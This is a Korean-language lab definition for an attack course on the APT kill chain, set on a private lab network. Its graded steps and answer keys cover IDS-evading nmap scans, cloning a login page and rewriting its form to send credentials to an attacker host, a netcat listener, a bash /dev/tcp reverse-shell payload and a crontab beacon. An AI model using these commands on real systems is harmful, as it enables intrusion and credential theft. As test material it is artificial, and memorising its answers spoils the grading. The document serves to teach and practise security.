lab_id: attack-adv-nonai-week01
title: APT 킬체인 분석과 공격 시뮬레이션
version: non-ai
course: attack-adv-nonai
week: 1
description: APT(Advanced Persistent Threat) 킬체인의 7단계를 심층 분석하고, 각 단계별 공격 기법을 실습 환경에서 시뮬레이션한다. Lockheed
  Martin 킬체인과 MITRE ATT&CK 프레임워크를 매핑하여 실제 위협 그룹의 TTPs를 재현한다.
difficulty: hard
duration_minutes: 120
objectives:
- APT 킬체인 7단계(정찰→무기화→전달→익스플로잇→설치→C2→목표달성)를 실습으로 이해한다
- MITRE ATT&CK 매트릭스와 킬체인을 매핑하여 공격 시나리오를 구성한다
- 각 킬체인 단계에서 사용되는 도구와 기법을 직접 적용한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: nmap을 사용하여 10.20.30.0/24 네트워크의 활성 호스트를 스텔스 스캔(-sS)으로 탐지하라. 타이밍 옵션을 T2로 설정하여 IDS 회피를 시도하라.
  hint: nmap -sS -T2 옵션을 사용하면 SYN 스캔을 느린 속도로 수행하여 탐지를 회피할 수 있다
  category: recon
  points: 10
  answer: nmap -sS -T2 --max-retries 1 --host-timeout 15s 10.20.30.0/24
  answer_detail: SYN 스캔(-sS)은 TCP 3-way handshake를 완료하지 않아 연결 로그에 남지 않는 스텔스 기법이다. T2(polite) 타이밍은 패킷 전송
    간격을 늘려 IDS/IPS의 임계값 기반 탐지를 회피한다. APT 정찰 단계에서 가장 기본적인 기법이다.
  verify:
    type: output_contains
    expect: 10.20.30.
    field: stdout
    semantic:
      intent: APT 정찰 스텔스 — sudo nmap -sS -T2 --max-retries 1 --host-timeout 15s 10.20.30.0/24. Lockheed
        Martin Kill Chain 1단계 Recon + MITRE T1595.001 Active Scanning. -sS SYN(3-way 미완) + T2 polite(임계값
        회피). APT 정찰 기본.
      success_criteria:
      - nmap -sS + -T2 옵션
      - 10.20.30 대역 출력
      - 스텔스 + 회피 맥락
      acceptable_methods:
      - nmap -sS -T2
      - masscan + 낮은 rate
      - scapy SYN scan
      negative_signs:
      - 스텔스 옵션 없음
      - 단일 호스트
      - 킬체인 맥락 없음
  target_vm: attacker
- order: 2
  instruction: 발견된 호스트 {{WEB_IP}}에 대해 서비스 버전 탐지(-sV)와 OS 핑거프린팅(-O)을 동시에 수행하라. 스크립트 스캔도 포함하라.
  hint: -sV -O -sC 옵션을 조합하면 상세 정보를 한 번에 수집할 수 있다
  category: recon
  points: 10
  answer: nmap -sV -O -sC --max-retries 1 --host-timeout 15s -T4 10.20.30.80
  answer_detail: -sV는 서비스 배너를 분석하여 정확한 버전을 식별하고, -O는 TCP/IP 스택 특성으로 OS를 추정한다. -sC는 기본 NSE 스크립트를 실행하여 추가
    정보(SSL 인증서, HTTP 제목 등)를 수집한다. 이는 킬체인 정찰 단계에서 공격 표면을 정의하는 핵심 과정이다.
  verify:
    type: output_contains
    expect: open
    field: stdout
    semantic:
      intent: 서비스/OS 핑거프린팅 — nmap -sV -O -sC -T4 10.20.30.80. -sV 배너 분석 + -O TCP/IP 스택 OS 추정 + -sC 기본
        NSE(SSL/HTTP). Kill Chain Recon 공격 표면 정의. MITRE T1592 Gather Victim Host Info.
      success_criteria:
      - -sV + -O + -sC 3옵션
      - open 포트 출력
      - 버전/OS 정보
      acceptable_methods:
      - nmap -sV -O -sC
      - nmap -A (all)
      - p0f passive fingerprinting
      negative_signs:
      - -sV 없음
      - OS 핑거프린트 없음
      - 단일 옵션만
  target_vm: attacker
- order: 3
  instruction: nmap NSE 스크립트를 활용하여 {{WEB_IP}}의 HTTP 서비스에서 알려진 취약점을 탐색하라. vuln 카테고리 스크립트를 실행하라.
  hint: --script vuln 옵션으로 취약점 탐지 스크립트를 일괄 실행할 수 있다
  category: recon
  points: 10
  answer: nmap --script vuln -p 80,3000 --max-retries 1 --host-timeout 15s -T4 10.20.30.80
  answer_detail: NSE(Nmap Scripting Engine)의 vuln 카테고리에는 CVE 기반 취약점 탐지 스크립트가 포함된다. http-vuln-*, ssl-heartbleed
    등이 자동 실행되며, 이는 킬체인의 정찰→무기화 전환 단계에서 공격 벡터를 선정하는 데 활용된다.
  verify:
    type: output_contains
    expect: vuln
    field: stdout
    semantic:
      intent: NSE 취약점 스캔 — nmap --script vuln -p 80,3000 -T4 10.20.30.80. Kill Chain Recon→Weaponization
        전환. http-vuln-* / ssl-heartbleed 자동 실행. CVE 매핑 → 공격 벡터 선정. MITRE T1595.002 Vulnerability Scanning.
      success_criteria:
      - --script vuln 실행
      - vuln 키워드 출력
      - 포트 지정 + CVE 탐지
      acceptable_methods:
      - nmap --script vuln
      - nuclei -t cves/
      - OpenVAS 자동 스캔
      negative_signs:
      - --script vuln 없음
      - 포트 미지정
      - 취약점 결과 없음
  target_vm: attacker
- order: 4
  instruction: curl을 사용하여 웹서버({{WEB_IP}}:3000)에서 피싱 페이지로 활용할 수 있는 로그인 페이지의 HTML 소스를 다운로드하라. 출력을 /tmp/phish_template.html에
    저장하라.
  hint: curl -o 옵션으로 파일로 저장할 수 있다
  category: exploit
  points: 10
  answer: curl -s -o /tmp/phish_template.html http://10.20.30.80:3000/ && ls -la /tmp/phish_template.html
    && echo "phish_template.html downloaded"
  answer_detail: APT 무기화 단계에서 스피어 피싱 이메일에 첨부할 피싱 페이지를 제작한다. 대상 조직의 실제 로그인 페이지를 복제하면 사회공학 공격의 성공률이 높아진다.
    HTML을 수정하여 자격증명을 공격자 서버로 전송하도록 변조한다.
  verify:
    type: output_contains
    expect: phish_template.html
    field: stdout
    semantic:
      intent: '피싱 템플릿 다운로드 — curl -s -o /tmp/phish_template.html http://10.20.30.80:3000/. Kill Chain
        Weaponization. 실제 사이트 복제로 사회공학 성공률↑. 후속: form action 변조 → 자격증명 수집. MITRE T1566.002 Spearphishing
        Link.'
      success_criteria:
      - curl -o 파일 저장
      - phish_template.html 키워드
      - ls 검증
      acceptable_methods:
      - curl -o + ls
      - wget -O
      - SET clone 자동화
      negative_signs:
      - 저장 검증 없음
      - 단순 GET (저장 X)
      - 복제 의도 없음
  target_vm: attacker
- order: 5
  instruction: 다운로드한 피싱 템플릿에서 form action URL을 공격자 서버({{ATTACKER_IP}}:4444)로 변조하라. sed를 사용하여 인라인 수정하라.
  hint: sed -i 's/원본/대체/g' 파일명 형태로 사용한다
  category: exploit
  points: 10
  answer: sed -i 's|action="[^"]*"|action="http://10.20.30.201:4444/capture"|g' /tmp/phish_template.html
    2>/dev/null; grep -o 'action="[^"]*"' /tmp/phish_template.html | head -3 || echo "No form action found
    - inserting..." && echo '<form action="http://10.20.30.201:4444/capture">' >> /tmp/phish_template.html
    && grep "10.20.30.201:4444" /tmp/phish_template.html
  answer_detail: 피싱 페이지의 form action을 변조하면 피해자가 입력한 자격증명이 공격자 서버로 전송된다. 실제 APT 그룹은 이를 더 정교하게 처리하여 원본 사이트로
    리다이렉트하여 피해자가 인지하지 못하게 한다. 이는 킬체인의 전달(Delivery) 단계에 해당한다.
  verify:
    type: output_contains
    expect: 10.20.30.201:4444
    field: stdout
    semantic:
      intent: form action 변조 — sed -i 's|action="[^"]*"|action="http://10.20.30.201:4444/capture"|g' template.
        Kill Chain Delivery. 자격증명을 공격자 서버로 전송. 정교한 APT는 정상 사이트 리다이렉트로 인지 회피. MITRE T1566.001.
      success_criteria:
      - sed -i action 변조
      - 10.20.30.201:4444 키워드
      - form action grep 검증
      acceptable_methods:
      - sed action 치환
      - BeautifulSoup form 수정
      - Evilginx2 자동 reverse proxy
      negative_signs:
      - 변조 없음
      - 공격자 서버 명시 없음
      - 검증 grep 없음
  target_vm: attacker
- order: 6
  instruction: netcat을 사용하여 {{ATTACKER_IP}}에서 포트 4444로 리스닝 상태를 만들어 리버스 셸 수신 준비를 하라. 백그라운드로 실행하라.
  hint: nc -lvnp 포트번호로 리스닝 모드를 설정한다
  category: exploit
  points: 10
  answer: nc -lvnp 4444 &>/tmp/nc_listener.log & sleep 1 && echo "netcat listening on port 4444" && ss
    -tlnp | grep 4444
  answer_detail: C2(Command & Control) 채널 설정의 기본은 리버스 셸이다. 리스너를 먼저 구성하고 페이로드가 실행되면 연결이 수립된다. APT 그룹은 단순
    netcat 대신 Cobalt Strike, Metasploit Handler 등을 사용하지만, 원리는 동일하다. 포트 4444는 실습용이며 실제로는 80, 443 등 일반 포트를
    사용한다.
  verify:
    type: output_contains
    expect: listening
    field: stdout
    semantic:
      intent: 'C2 리스너 — nc -lvnp 4444 & + ss -tlnp | grep 4444. Kill Chain C2. 리스너 선구성 → 페이로드 실행 시 연결
        수립. 실전 APT: Cobalt Strike/Metasploit Handler. 실제는 80/443 일반 포트 사용. MITRE T1071.'
      success_criteria:
      - nc -lvnp 4444 백그라운드
      - listening 키워드
      - ss/netstat 포트 검증
      acceptable_methods:
      - nc -lvnp
      - Cobalt Strike Beacon
      - Metasploit multi/handler
      negative_signs:
      - 리스너 미실행
      - 포트 검증 없음
      - 포트 4444 외 임의 포트
  target_vm: attacker
- order: 7
  instruction: bash를 사용하여 Linux용 리버스 셸 페이로드 스크립트를 수동으로 생성하라. LHOST={{ATTACKER_IP}}, LPORT=4444를 설정하라.
  hint: bash reverse shell 원리를 이해하고 ELF-like 스크립트 파일로 저장한다
  category: exploit
  points: 10
  answer: printf "#!/bin/bash\n# Reverse Shell Payload (simulation)\n# LHOST=10.20.30.201 LPORT=4444\n#
    bash -i >& /dev/tcp/10.20.30.201/4444 0>&1\necho \"payload executed (simulation)\"\n" > /tmp/payload.elf
    && chmod +x /tmp/payload.elf && echo "payload.elf generated" && file /tmp/payload.elf && cat /tmp/payload.elf
  answer_detail: APT 무기화 단계에서 드로퍼(Dropper)나 백도어를 제작한다. 실습에서는 msfvenom 대신 수동으로 리버스 셸 스크립트를 작성하여 페이로드 생성
    원리를 학습한다. bash reverse shell은 /dev/tcp를 활용하여 공격자 서버로 셸을 연결하는 기법이다.
  verify:
    type: output_contains
    expect: payload.elf
    field: stdout
    semantic:
      intent: '리버스 셸 페이로드 생성 — printf #!/bin/bash 헤더 + bash -i >& /dev/tcp/10.20.30.201/4444 0>&1 + chmod
        +x payload.elf. Kill Chain Weaponization. msfvenom 대신 수동 작성으로 원리 학습. /dev/tcp 가상 디바이스. MITRE T1059.004
        Unix Shell.'
      success_criteria:
      - payload.elf 생성
      - /dev/tcp/10.20.30.201/4444 패턴
      - chmod +x + file 검증
      acceptable_methods:
      - bash /dev/tcp 페이로드
      - msfvenom -p linux/x64/shell_reverse_tcp
      - python -c socket
      negative_signs:
      - LHOST/LPORT 없음
      - 실행 권한 미부여
      - 셸 호출 없음
  target_vm: attacker
- order: 8
  instruction: 생성된 페이로드의 해시값(SHA256)을 계산하고, VirusTotal에서 탐지될 수 있는지 확인하기 위해 strings 명령으로 시그니처 문자열을 검사하라.
  hint: sha256sum과 strings 명령을 조합한다
  category: analysis
  points: 10
  answer: sha256sum /tmp/payload.elf && echo "--- Strings analysis ---" && strings /tmp/payload.elf &&
    echo "--- File type ---" && file /tmp/payload.elf
  answer_detail: 페이로드의 해시값은 위협 인텔리전스에서 IoC(Indicator of Compromise)로 활용된다. strings 명령으로 바이너리에서 읽을 수 있는
    문자열을 추출하면 AV 시그니처에 포함될 수 있는 패턴을 확인할 수 있다. APT 그룹은 패킹, 인코딩, 커스텀 암호화로 탐지를 회피한다.
  verify:
    type: output_contains
    expect: /bin/bash
    field: stdout
    semantic:
      intent: 페이로드 시그니처 분석 — sha256sum + strings + file. 위협 인텔리전스 IoC. AV 시그니처 패턴 확인 → APT는 패킹/인코딩/커스텀
        암호화로 회피. MITRE T1027 Obfuscated Files. STIX/TAXII 공유.
      success_criteria:
      - sha256sum + strings + file 3종
      - /bin/bash 패턴 출력
      - IoC 분석 맥락
      acceptable_methods:
      - sha256/strings/file
      - VirusTotal API
      - yara 룰 매칭
      negative_signs:
      - 해시 없음
      - strings 없음
      - IoC 맥락 없음
  target_vm: attacker
- order: 9
  instruction: MITRE ATT&CK 프레임워크에서 Persistence 기법을 시뮬레이션하라. crontab에 매 5분마다 공격자 서버로 비콘을 보내는 항목을 추가하라(실습용,
    실제 연결은 안 됨).
  hint: crontab -e 대신 echo와 crontab을 조합하여 비대화형으로 추가한다
  category: exploit
  points: 10
  answer: (crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://10.20.30.201:4444/beacon') | crontab
    - && crontab -l | grep beacon
  answer_detail: 'Persistence(지속성 확보)는 킬체인 설치 단계의 핵심이다. crontab을 통한 주기적 비콘은 가장 단순한 지속성 기법이며, MITRE ATT&CK
    T1053.003(Scheduled Task/Job: Cron)에 해당한다. 실제 APT는 systemd 서비스, init.d 스크립트, 커널 모듈 등 더 은밀한 방법을 사용한다.'
  verify:
    type: output_contains
    expect: beacon
    field: stdout
    semantic:
      intent: Persistence 비콘 — (crontab -l; echo '*/5 * * * * curl -s http://10.20.30.201:4444/beacon')
        | crontab -. Kill Chain Installation. MITRE T1053.003 Cron. 실전 APT는 systemd/init.d/커널 모듈 등 더 은밀한
        방법 사용.
      success_criteria:
      - crontab + beacon 추가
      - '*/5 주기 명시'
      - crontab -l 검증
      acceptable_methods:
      - crontab 비콘
      - systemd 타이머
      - anacron/at
      negative_signs:
      - crontab 없음
      - 주기 미설정
      - 검증 없음
  target_vm: attacker
- order: 10
  instruction: 설치한 crontab 비콘 항목을 확인하고, 방어자 관점에서 이를 탐지하기 위해 /var/log/syslog에서 cron 관련 로그를 검색하라.
  hint: crontab -l로 현재 등록된 작업을 확인하고, grep으로 로그를 검색한다
  category: analysis
  points: 10
  answer: crontab -l && grep -i cron /var/log/syslog | tail -20
  answer_detail: 방어자는 crontab 변경을 모니터링하여 비인가 스케줄링을 탐지한다. auditd로 crontab 파일 변경을 감시하거나, SIEM에서 cron 관련
    syslog를 수집하여 이상 패턴을 탐지할 수 있다. 이는 킬체인 분석에서 양측 관점을 이해하는 데 중요하다.
  verify:
    type: output_contains
    expect: beacon
    field: stdout
    semantic:
      intent: 방어자 cron 탐지 — crontab -l + grep -i cron /var/log/syslog. auditd로 crontab 변경 감시 + SIEM cron
        syslog 수집 → 이상 패턴. NIST CSF Detect. 양측 관점 이해.
      success_criteria:
      - crontab -l + syslog grep
      - beacon 키워드 출력
      - 방어자 관점 명시
      acceptable_methods:
      - syslog grep + auditd
      - Wazuh syscheck
      - Sysmon (Linux) 모니터링
      negative_signs:
      - 로그 검사 없음
      - 방어자 맥락 없음
      - 단순 crontab만
  target_vm: attacker
- order: 11
